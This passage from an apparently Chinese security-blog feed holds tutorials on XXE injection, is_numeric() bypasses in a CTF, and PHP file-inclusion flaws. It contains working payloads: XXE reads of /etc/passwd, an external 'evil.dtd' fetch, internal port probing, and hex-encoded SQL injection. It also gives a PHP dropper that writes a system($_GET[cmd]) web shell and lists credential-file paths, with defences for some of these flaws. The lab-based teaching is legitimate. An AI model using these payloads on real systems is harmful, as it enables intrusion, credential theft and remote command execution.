class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">引用的evil.dtd的内容为：</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">evil</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h1><p>利用BWAPP和xxe_lab理解XXE漏洞，然后通过php代码复现漏洞</p><h2 id="BWAPP-XSS"><a href="#BWAPP-XSS" class="headerlink" title="BWAPP_XSS"></a>BWAPP_XSS</h2><p>BWAPP_XSS界面如图</p><p><img src="https://i.loli.net/2020/05/28/TUwPJZSLBmW7HKV.jpg" alt="Xnip2020-05-28_16-13-23.jpg"></p><p>点击Any bugs，抓包后发送到repeater</p><p><img src="https://i.loli.net/2020/05/28/BdOTqKvrQCFJNYy.jpg"></p><p>我们先判断它可不可以返回信息，构造xml如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">&quot;hello hacker&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">定义hacker实体的值为hello hacker</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/05/28/kxAsnOC8IXN9tGD.jpg" alt="Xnip2020-05-28_16-24-42.jpg"></p><p>Response返回了hakcer实体的值，可见这是一个有回显的XXE。既然有回显，我们就可以读取目标服务器中的任意文件。构造payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/05/28/uBKWpRekfHw7Oon.jpg" alt="Xnip2020-05-28_16-28-38.jpg"></p><p>成功读取/etc下的passwd文件，形成了任意文件读取，XXE漏洞利用完毕。</p><h2 id="XXE-lab"><a href="#XXE-lab" class="headerlink" title="XXE_lab"></a>XXE_lab</h2><p>XXE_lab的利用过程和BWAPP_XSS类似，这里只给出payload，不截图展示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;payload;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE漏洞php代码复现"><a href="#XXE漏洞php代码复现" class="headerlink" title="XXE漏洞php代码复现"></a>XXE漏洞php代码复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $html&#x3D;&#39;&#39;;</span><br><span class="line">    if(isset($_POST[&#39;submit&#39;]) and $_POST[&#39;xml&#39;] !&#x3D; null)&#123;</span><br><span class="line">    $xml &#x3D;$_POST[&#39;xml&#39;];</span><br><span class="line">    $data &#x3D; @simplexml_load_string($xml,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);</span><br><span class="line">    if($data)&#123;</span><br><span class="line">        $html.&#x3D;&quot;&lt;pre&gt;&#123;$data&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.&#x3D;&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果$html不返回$data就是无回显的XXE漏洞</span><br><span class="line">?&gt;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;这是一个接收xml数据的api:&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xml&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php echo $html;?&gt;</span><br></pre></td></tr></table></figure><h1 id="XXE漏洞的危害"><a href="#XXE漏洞的危害" class="headerlink" title="XXE漏洞的危害"></a>XXE漏洞的危害</h1><ol><li><p>XXE漏洞可以构成任意文件读取，比如读取linux服务器下的/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell</p></li><li><p>执行系统命令</p></li><li><p>探测内网端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造xml如下：</span><br><span class="line">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY payload SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">根据页面返回可以推测192.168.1.1的80端口是否开启服务</span><br></pre></td></tr></table></figure></li></ol><h1 id="XXE漏洞的防御"><a href="#XXE漏洞的防御" class="headerlink" title="XXE漏洞的防御"></a>XXE漏洞的防御</h1><ol><li><p>禁止外部实体调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure></li><li><p>过滤用户输入：比如过滤’DOCTYPE’，’SYSTEM’，’ENTITY’等关键字。</p></li></ol><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本篇只概述了有回显的XXE漏洞，重点在于理解XML和DTD实体，以及XML漏洞的利用思路。下一篇将介绍没有回显的XML漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;XXE漏洞全称XML External Entity Injection，是一种近些年出现在OWASP TOP 10中的注入漏洞，它是通过X</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>关于is_numeric()函数的作用和绕过</title>
    <link href="http://yoursite.com/2020/05/26/eee/"/>
    <id>http://yoursite.com/2020/05/26/eee/</id>
    <published>2020-05-26T04:56:39.000Z</published>
    <updated>2020-05-26T07:12:50.749Z</updated>
    
    <content type="html"><![CDATA[<p>今天偶然看到了一道CTF题目，主要是对is_numeric()函数作用和绕过方式的理解，下面总结一下这两部分。</p><h1 id="is-numeric-函数的作用"><a href="#is-numeric-函数的作用" class="headerlink" title="is_numeric()函数的作用"></a>is_numeric()函数的作用</h1><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。如果是数字或者字符串就返回true，如果不是则返回flase，以下面代码为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $num = <span class="number">123</span>;</span><br><span class="line">    $str = <span class="string">&#x27;hello hacker&#x27;</span>;</span><br><span class="line">  $result1 = is_numeric($num);</span><br><span class="line">    $result2 = is_numeric($str);</span><br><span class="line">    <span class="keyword">echo</span> $result1;</span><br><span class="line">    <span class="keyword">echo</span> $result2;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入出结果为，$result1=ture;$result2=flase</p><p>注意：is_numeric()函数一般适用于PHP4，PHP5，php7的版本。</p><h1 id="is-numeric-函数的绕过方式"><a href="#is-numeric-函数的绕过方式" class="headerlink" title="is_numeric()函数的绕过方式"></a>is_numeric()函数的绕过方式</h1><p>注意下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($num))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $num;</span><br><span class="line">        <span class="keyword">if</span>($num==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下这段代码，只有在<font color='red'>$num不是数字或者字符串，并且$num等于1</font>的时候才能输出flag。这里介绍两种绕过方式。</p><h2 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h2><p>科学计数法在运算上最终等于一个数值，但是在格式上是一个字符串，可以满足代码的要求，所以我们只要构造最终值等于1的科学计数法即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload：    ?$num &#x3D; 1*e*0.1</span><br></pre></td></tr></table></figure><p>得到flag如图：</p><img src="https://i.loli.net/2020/05/26/c8dmGvWwEH4qaM1.jpg" alt="Xnip2020-05-26_14-42-14.jpg" style="zoom: 80%;" /><h2 id="利用PHP弱类型语言特性"><a href="#利用PHP弱类型语言特性" class="headerlink" title="利用PHP弱类型语言特性"></a>利用PHP弱类型语言特性</h2><p>因为PHP是一种弱类型语言，所以有’==’和’===’两种判断方式，这里对两种判断方式的区别不做阐述了，基础的东西都可以百度。’==’只要在数值上相等就可以了，类型上不作要求。那么我们思考这样一个问题：<font color='red'>PHP是如何判断两个变量在数值上相等的</font>，或者换一个说法，如何判断一个数字和一个字符串在数值上相等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php判断字符串以数字开头即可判断与相应的数值等值。比如：1x &#x3D;&#x3D; 1; 2 &#x3D;&#x3D; 2a</span><br></pre></td></tr></table></figure><p>所以我们构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:    ?num&#x3D;1a</span><br></pre></td></tr></table></figure><p>得到flag:</p><p><img src="https://i.loli.net/2020/05/26/pDtjrlnPQXzHVFB.jpg" alt="Xnip2020-05-26_14-56-30.jpg"></p><h1 id="is-numeric-函数与mysql结合的利用"><a href="#is-numeric-函数与mysql结合的利用" class="headerlink" title="is_numeric()函数与mysql结合的利用"></a>is_numeric()函数与mysql结合的利用</h1><p>is_numeric()函数与mysql结合时也会发生意想不到的事情。比如下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$s = is_numeric($_GET[<span class="string">&#x27;s&#x27;</span>])?$_GET[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line">$sql=<span class="string">&quot;insert into test(type)values($s);&quot;</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>这段代码的本意是好的，判断参数s是否为数字，是则返回数字，不是则返回0，然后带入数据库查询。这样就可以过滤掉字符输入，构造不了sql查询语句，可以有效地防止sql注入。但是这种方法忽略了is_numeric()函数和mysql数据库对十六进制的不同转义方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">is_numeric()：当遇到十六进制时，会判断成数字。比如：</span><br><span class="line">        &lt;?php echo is_numeric(&#39;0x233333&#39;);?&gt;    &#x2F;&#x2F;输出结果为1，是true</span><br><span class="line"></span><br><span class="line">mysql：而在mysql中，插入0x开头的十六进制数的时候，会自动转成字符插入。</span><br></pre></td></tr></table></figure><p>因为这样的原理，我们可以把’1 or 1’转换成十六进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;1 or 1&#39; 转换成 0x31206f722031 就可以继续执行语句了。</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>php使用弱类型语言，类似于is_numeric()函数的不安全函数还有很多，今后要慢慢总结。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天偶然看到了一道CTF题目，主要是对is_numeric()函数作用和绕过方式的理解，下面总结一下这两部分。&lt;/p&gt;
&lt;h1 id=&quot;is-numeric-函数的作用&quot;&gt;&lt;a href=&quot;#is-numeric-函数的作用&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>浅谈文件包含漏洞</title>
    <link href="http://yoursite.com/2020/05/25/file-inclusion/"/>
    <id>http://yoursite.com/2020/05/25/file-inclusion/</id>
    <published>2020-05-25T07:10:09.000Z</published>
    <updated>2020-05-25T12:21:17.067Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈文件包含漏洞"><a href="#浅谈文件包含漏洞" class="headerlink" title="浅谈文件包含漏洞"></a>浅谈文件包含漏洞</h1><h2 id="什么是文件包含漏洞以及其原理"><a href="#什么是文件包含漏洞以及其原理" class="headerlink" title="什么是文件包含漏洞以及其原理"></a>什么是文件包含漏洞以及其原理</h2><p>在web程序中经常遇到这种情况：通过调用本地的php文件来显示页面信息，如show.php?file=xxx.php，这一过程主要是通过下列四个函数实现的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()        <span class="comment">//在包含过程中如果出现错误，会抛出一个警告，但是程序仍会进行下去</span></span><br><span class="line"><span class="keyword">require</span>()        <span class="comment">//在包含过程中如果出现错误，会抛出一个警告，并且退出程序</span></span><br><span class="line"><span class="keyword">include_once</span>()        <span class="comment">//只包含一次，避免函数重定义，变量重新赋值等问题</span></span><br><span class="line"><span class="keyword">require_once</span>()        <span class="comment">//只包含一次，避免函数重定义，变量重新赋值等问题</span></span><br></pre></td></tr></table></figure><p>如果包含的文件可能是用户可控的参数，且没有经过安全校验，则很有可能产生文件包含漏洞，比如下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;file&#x27;</span>] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;$filename&#x27;</span>;    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    将用户可控参数file赋值给$filename后没有经过任何校验就直接包含，这样攻击者可以通过可控参数包含许多“意料之外”的文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由此可见，大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。但是有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。</p><h2 id="文件包含漏洞的分类"><a href="#文件包含漏洞的分类" class="headerlink" title="文件包含漏洞的分类"></a>文件包含漏洞的分类</h2><p>根据不同的配置环境以及不同的攻击效果，文件包含漏洞可以分为<font color='red'>本地文件包含和远程文件包含</font></p><h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><p>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p><h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><p>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。如果遇到远程文件包含漏洞，我自己的思路有两个：<font color='red'>1. 写入一句话木马，直接拿shell    2. 写入system()函数，获得更多系统信息。</font></p><h2 id="文件包含漏洞的利用"><a href="#文件包含漏洞的利用" class="headerlink" title="文件包含漏洞的利用"></a>文件包含漏洞的利用</h2><h3 id="本地文件包含的利用"><a href="#本地文件包含的利用" class="headerlink" title="本地文件包含的利用"></a>本地文件包含的利用</h3><h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><p> <img src="https://i.loli.net/2020/05/25/gcKkd4VCw3Xi69o.jpg" alt="Xnip2020-05-25_18-13-14.jpg"></p><p>如图所示，这是一个下拉列表提交栏，通过下拉列表调用相应的php文件。</p><p><img src="https://i.loli.net/2020/05/25/srzVqyf1FcABKgM.jpg" alt="Xnip2020-05-25_18-20-10.jpg"></p><p>我们在根目录下，有一个flag.php文件，我们看能不能通过filename参数去包含flag.php文件，我们构造URL如下图：</p><img src="https://i.loli.net/2020/05/25/YshzjmDrRW96n58.jpg" alt="Xnip2020-05-25_18-21-53.jpg" style="zoom:50%;" /><p>页面成功显示flag.php信息</p><p><img src="https://i.loli.net/2020/05/25/VSeEJMvA4zpyIb3.jpg" alt="Xnip2020-05-25_18-22-59.jpg"></p><p>本地文件包含利用成功。</p><h4 id="本地文件包含的敏感路径"><a href="#本地文件包含的敏感路径" class="headerlink" title="本地文件包含的敏感路径"></a>本地文件包含的敏感路径</h4><p>常见敏感信息路径</p><p>windows系统：</p><p>　　c:\boot.ini      //  查看系统版本</p><p>　　c:\windows\system32\inetsrc\MetaBase.xml      //IIS配置文件</p><p>　　c:\windows\repair\sam      //存储windows系统初次安装的密码</p><p>　　c:\programFiles\mysql\my.ini      //MYSQL root密码</p><p>　　c:\windows\php.ini     // php 配置信息</p><p>Linux/Unix系统：</p><pre><code>  /etc/passwd     // 账户信息  /etc/shadow     // 账户密码文件  /usr/local/app/apache2/conf/httpd.conf     // Apache2默认配置文件  /usr/local/app/apache2/conf/extra/httpd-vhost.conf     // 虚拟网站配置  /usr/local/app/php5/lib/php.ini     // PHP相关配置  /etc/httpd/conf/httpd.conf     // Apache配置文件  /etc/my.conf     // mysql 配置文件</code></pre><h4 id="本地文件包含限制绕过"><a href="#本地文件包含限制绕过" class="headerlink" title="本地文件包含限制绕过"></a>本地文件包含限制绕过</h4><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>%00截断</p><p>利用条件：magic_quotes_gpc = Off 并且PHP的版本&lt;5.3.4</p><p>利用形式：?file=../../../flag.php%00</p></li><li><p>路径长度截断</p><p>条件：windows下目录路径最大长度为256字节，超出部分将丢弃；Linux下目录最大长度为4096字节，超出长度将丢弃</p><p>利用形式：?file=text.txt././././.  或 ?file=test.txt…..</p></li></ol><h3 id="远程文件包含漏洞的利用"><a href="#远程文件包含漏洞的利用" class="headerlink" title="远程文件包含漏洞的利用"></a>远程文件包含漏洞的利用</h3><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>用system()函数构造php文件，或者直接构造一句话木马，具体代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    利用远程文件包含，在目标靶机中创建一句话木马</span></span><br><span class="line"><span class="comment">    这里我们不适用一句话木马，而是使用system()函数执行系统命令</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $myfile = fopen(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    $text = <span class="string">&#x27;&lt;?php system($_GET[cmd]); ?&gt;&#x27;</span>;    <span class="comment">//system()函数执行命令行命令</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $text = &#x27;&lt;?php eval(@$_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;;    //一句话木马</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    fwrite($myfile, $text);</span><br><span class="line">    fclose($myfile);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造paload，利用filename远程调用shell.php达到getshell的目的。</p><img src="https://i.loli.net/2020/05/25/vHKGMTXJqceILEC.jpg" alt="Xnip2020-05-25_20-05-58.jpg" style="zoom:50%;" /><p>之后的步骤，菜刀连一句话木马。如果用的是system()函数，则构造payload，如：shell.php?cmd=whoami等获得更多系统信息。</p><h4 id="远程文件包含限制绕过"><a href="#远程文件包含限制绕过" class="headerlink" title="远程文件包含限制绕过"></a>远程文件包含限制绕过</h4><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拼接了html后缀，拼接到最后远程包含的文件中，拼接后的文件也会多一个HTML后缀。</p><p><strong>问号绕过</strong></p><p>　　测试：?filename=<a href="http://xxx/php.txt">http://xxx/php.txt</a>?</p><p><strong>#号绕过</strong></p><p>　　测试：?filenamr=<a href="http://xxx/php.txt%23">http://xxx/php.txt%23</a></p><p><strong>空格绕过</strong></p><p>　　测试：?filename=<a href="http://xxx/php.txt%20">http://xxx/php.txt%20</a></p><h2 id="文件包含的防御"><a href="#文件包含的防御" class="headerlink" title="文件包含的防御"></a>文件包含的防御</h2><ol><li>设置allow_url_include=off，不允许通过url调用远程文件，能够有效地防御远程文件包含。</li><li>将用户提交的可控参数file赋值给$filename变量时进行严格的安全校验。</li><li>对用户输入进行过滤。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;浅谈文件包含漏洞&quot;&gt;&lt;a href=&quot;#浅谈文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;浅谈文件包含漏洞&quot;&gt;&lt;/a&gt;浅谈文件包含漏洞&lt;/h1&gt;&lt;h2 id=&quot;什么是文件包含漏洞以及其原理&quot;&gt;&lt;a href=&quot;#什么是文件包含漏洞以及其原理&quot;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>WEB漏洞攻防靶场综述</title>
    <link href="http://yoursite.com/2020/05/23/webbachang/"/>
